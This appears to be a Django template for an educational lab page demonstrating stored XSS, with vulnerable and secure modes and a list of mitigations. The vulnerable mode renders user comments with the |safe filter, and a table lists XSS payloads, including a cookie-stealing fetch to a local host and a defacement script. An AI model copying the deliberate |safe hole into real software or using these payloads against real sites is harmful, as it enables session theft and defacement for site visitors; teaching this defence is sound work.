@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored XSS Demo — {{ mode|title }}</title>
+    <style>
+        /* ── Reset & Base ── */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* ── Warning Banner ── */
+        .banner {
+            background: linear-gradient(135deg, #e65100, #bf360c);
+            color: #fff;
+            text-align: center;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        /* ── Navigation ── */
+        .nav-bar {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .nav-bar a {
+            color: #aaa;
+            text-decoration: none;
+            margin: 0 14px;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+        .nav-bar a:hover, .nav-bar a.active { color: #fff; font-weight: bold; }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 6px;
+            color: #fff;
+        }
+        .page-subtitle {
+            text-align: center;
+            color: #888;
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        /* ── Mode Switcher ── */
+        .mode-switch {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .mode-switch a {
+            display: inline-block;
+            padding: 10px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 0 8px;
+            transition: all 0.2s;
+        }
+        .mode-switch .vuln-btn {
+            background: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2a2a3e{% endif %};
+            color: #fff;
+            border: 2px solid #e74c3c;
+        }
+        .mode-switch .sec-btn {
+            background: {% if mode == 'secure' %}#2ecc71{% else %}#2a2a3e{% endif %};
+            color: #fff;
+            border: 2px solid #2ecc71;
+        }
+
+        /* ── Layout ── */
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        /* ── Comment Form ── */
+        .form-card {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 2px solid {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+        }
+        .form-card h2 {
+            color: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            margin-bottom: 6px;
+            font-size: 18px;
+        }
+        .form-card .form-subtitle {
+            color: #888;
+            font-size: 12px;
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            margin-bottom: 4px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 10px 12px;
+            margin-bottom: 14px;
+            border: 1px solid #333;
+            border-radius: 6px;
+            background: #0f0f1a;
+            color: #e0e0e0;
+            font-size: 14px;
+            font-family: inherit;
+        }
+        textarea { resize: vertical; min-height: 70px; }
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #666;
+        }
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .btn:hover { opacity: 0.85; }
+        .btn-danger { background: #e74c3c; color: #fff; }
+        .btn-success { background: #2ecc71; color: #fff; }
+
+        /* ── Comments List ── */
+        .comments-section {
+            background: #1a1a2e;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid #333;
+            margin-bottom: 24px;
+        }
+        .comments-section h3 {
+            color: #f39c12;
+            margin-bottom: 14px;
+            font-size: 16px;
+        }
+        .comment {
+            background: #0f0f1a;
+            border: 1px solid #2a2a3e;
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 10px;
+        }
+        .comment-author {
+            font-weight: bold;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+        .comment-text {
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .no-comments {
+            color: #666;
+            font-style: italic;
+            font-size: 13px;
+        }
+
+        /* ── How It Works ── */
+        .info-box {
+            max-width: 800px;
+            margin: 0 auto 24px;
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 24px;
+        }
+        .info-box h3 { color: #f39c12; margin-bottom: 12px; }
+        .info-box code {
+            background: #111;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #e74c3c;
+            font-size: 13px;
+        }
+        .info-box li { margin-bottom: 8px; line-height: 1.5; font-size: 14px; }
+        .info-box pre {
+            background: #111;
+            padding: 14px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 12px;
+            color: #f39c12;
+            margin-top: 8px;
+            line-height: 1.6;
+        }
+
+        .step-box {
+            background: #111;
+            border-left: 4px solid {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            padding: 14px;
+            border-radius: 0 8px 8px 0;
+            margin: 12px 0;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+        .step-box .step-num {
+            color: {% if mode == 'vulnerable' %}#e74c3c{% else %}#2ecc71{% endif %};
+            font-weight: bold;
+        }
+
+        /* ── Mitigation ── */
+        .mitigation {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #0d2818;
+            border: 2px solid #2ecc71;
+            border-radius: 12px;
+            padding: 24px;
+        }
+        .mitigation h3 { color: #2ecc71; margin-bottom: 12px; }
+        .mitigation li { margin-bottom: 8px; line-height: 1.5; font-size: 14px; }
+        .mitigation code {
+            background: #111;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #2ecc71;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="banner">
+        ⚠️ EDUCATIONAL DEMO ONLY — Stored XSS Demonstration ⚠️
+    </div>
+
+    <div class="nav-bar">
+        <a href="/xss/">⚡ Dashboard</a>
+        <a href="/xss/stored/vulnerable/" class="{% if mode == 'vulnerable' %}active{% endif %}">💾 Stored XSS</a>
+        <a href="/xss/reflected/vulnerable/">🔄 Reflected XSS</a>
+        <a href="/xss/dom/">🌐 DOM XSS</a>
+    </div>
+
+    <h1>💾 Stored XSS (Persistent)</h1>
+    <p class="page-subtitle">Malicious scripts are saved in the database and execute for every visitor</p>
+
+    <!-- Mode Switcher -->
+    <div class="mode-switch">
+        <a href="/xss/stored/vulnerable/" class="vuln-btn">🔴 Vulnerable</a>
+        <a href="/xss/stored/secure/" class="sec-btn">🟢 Secure</a>
+    </div>
+
+    <div class="container">
+
+        <!-- How It Works -->
+        <div class="info-box">
+            <h3>{% if mode == 'vulnerable' %}⚠️ How the Attack Works{% else %}✅ How the Protection Works{% endif %}</h3>
+
+            {% if mode == 'vulnerable' %}
+            <div class="step-box">
+                <p><span class="step-num">STEP 1:</span> Attacker submits a comment containing malicious JavaScript</p>
+                <p><span class="step-num">STEP 2:</span> The comment is saved to the database <strong>WITHOUT sanitization</strong></p>
+                <p><span class="step-num">STEP 3:</span> Template renders with <code>|safe</code> filter → browser executes the script</p>
+                <p><span class="step-num">STEP 4:</span> Every visitor's browser runs the attacker's code</p>
+            </div>
+            <p style="margin-top:12px; font-size:13px; color:#888;">
+                Template code: <code>{% verbatim %}{{ comment.text|safe }}{% endverbatim %}</code> ← tells Django <strong>NOT</strong> to escape HTML
+            </p>
+            {% else %}
+            <div class="step-box">
+                <p><span class="step-num">STEP 1:</span> Attacker submits a comment containing malicious JavaScript</p>
+                <p><span class="step-num">STEP 2:</span> The comment is saved to the database</p>
+                <p><span class="step-num">STEP 3:</span> Template renders with auto-escaping → <code>&lt;</code> becomes <code>&amp;lt;</code></p>
+                <p><span class="step-num">STEP 4:</span> Browser displays script as plain text — <strong>NOT executed!</strong></p>
+            </div>
+            <p style="margin-top:12px; font-size:13px; color:#888;">
+                Template code: <code>{% verbatim %}{{ comment.text }}{% endverbatim %}</code> ← Django auto-escapes by default
+            </p>
+            {% endif %}
+        </div>
+
+        <!-- Comment Form -->
+        <div class="form-card">
+            <h2>{% if mode == 'vulnerable' %}🔴 Post a Comment (Vulnerable){% else %}🟢 Post a Comment (Secure){% endif %}</h2>
+            <p class="form-subtitle">
+                {% if mode == 'vulnerable' %}
+                Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or
+                <code>&lt;img src=x onerror=alert('Hacked!')&gt;</code>
+                {% else %}
+                Try the same payloads here — they will be safely escaped
+                {% endif %}
+            </p>
+
+            <form method="POST" action="{% if mode == 'vulnerable' %}/xss/stored/vulnerable/{% else %}/xss/stored/secure/{% endif %}">
+                {% csrf_token %}
+                <label for="author">Name</label>
+                <input type="text" id="author" name="author" placeholder="Your name" required>
+
+                <label for="text">Comment</label>
+                <textarea id="text" name="text" placeholder="Type your comment (try injecting a script tag!)" required></textarea>
+
+                <button type="submit" class="btn {% if mode == 'vulnerable' %}btn-danger{% else %}btn-success{% endif %}">
+                    Post Comment
+                </button>
+            </form>
+        </div>
+
+        <!-- Payload Examples -->
+        <div class="payload-section" style="background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 24px; margin-bottom: 24px;">
+            <h3 style="color: #f39c12; margin-bottom: 14px; font-size: 16px;">💡 Malicious Payload Examples</h3>
+            <p style="color: #aaa; font-size: 13px; margin-bottom: 16px;">Try injecting these into the comment field to see how they work.</p>
+            
+            <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
+                <tr style="border-bottom: 1px solid #333;">
+                    <th style="text-align: left; padding: 10px; color: #888;">Attack Type</th>
+                    <th style="text-align: left; padding: 10px; color: #888;">Payload</th>
+                    <th style="text-align: left; padding: 10px; color: #888;">Description</th>
+                </tr>
+                <tr style="border-bottom: 1px solid #2a2a3e;">
+                    <td style="padding: 10px; font-weight: bold; color: #e74c3c;">Reconnaissance</td>
+                    <td style="padding: 10px;"><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Proves JS execution is possible and reads the victim's cookies (if not HttpOnly).</td>
+                </tr>
+                <tr style="border-bottom: 1px solid #2a2a3e;">
+                    <td style="padding: 10px; font-weight: bold; color: #e67e22;">Cookie Stealing</td>
+                    <td style="padding: 10px;"><code>&lt;script&gt;fetch('http://127.0.0.1:8000/?steal='+document.cookie)&lt;/script&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Silently sends the victim's cookies to the attacker's server in the background.</td>
+                </tr>
+                <tr>
+                    <td style="padding: 10px; font-weight: bold; color: #9b59b6;">Defacement</td>
+                    <td style="padding: 10px;"><code>&lt;script&gt;document.body.innerHTML='&lt;h1 style="color:red;font-size:50px;"&gt;YOU HAVE BEEN HACKED!&lt;/h1&gt;'&lt;/script&gt;</code></td>
+                    <td style="padding: 10px; color: #aaa;">Overwrites the entire page content with the attacker's message.</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- Comments -->
+        <div class="comments-section">
+            <h3>💬 Comments ({{ comments|length }})</h3>
+
+            {% if comments %}
+                {% for comment in comments %}
+                <div class="comment">
+                    <div class="comment-author">{{ comment.author }} — {{ comment.created_at|date:"M d, Y H:i" }}</div>
+                    <div class="comment-text">
+                        {% if mode == 'vulnerable' %}
+                            {{ comment.text|safe }}
+                        {% else %}
+                            {{ comment.text }}
+                        {% endif %}
+                    </div>
+                </div>
+                {% endfor %}
+            {% else %}
+                <p class="no-comments">No comments yet. Be the first to post!</p>
+            {% endif %}
+        </div>
+
+    </div>
+
+    <!-- Mitigation -->
+    <div class="mitigation">
+        <h3>🛡️ Mitigation Techniques for Stored XSS</h3>
+        <ul>
+            <li><strong>Output Encoding:</strong> Never use <code>|safe</code> on user-generated content. Django auto-escapes by default — leave it on!</li>
+            <li><strong>Input Sanitization:</strong> Use libraries like <code>bleach</code> to strip dangerous tags while allowing safe HTML (e.g., <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>)</li>
+            <li><strong>Content Security Policy (CSP):</strong> Add <code>Content-Security-Policy</code> headers to prevent inline script execution</li>
+            <li><strong>HTTPOnly Cookies:</strong> Set <code>HttpOnly</code> flag on session cookies to prevent JavaScript from accessing them</li>
+            <li><strong>Input Validation:</strong> Validate and reject input that contains suspicious patterns (as an additional layer)</li>
+        </ul>
+        <pre>
+{% verbatim %}# SAFE -- Django auto-escapes by default
+{{ comment.text }}
+
+# DANGEROUS -- Disables auto-escaping
+{{ comment.text|safe }}{% endverbatim %}
+
+# ✅ RECOMMENDED — Use bleach for allowing safe HTML
+import bleach
+clean_text = bleach.clean(user_input, tags=['b', 'i', 'em', 'strong'])
+
+# ✅ ADD CSP HEADER in settings.py or middleware
+# Content-Security-Policy: default-src 'self'; script-src 'self'
+        </pre>
+    </div>
+
+</body>
+</html>
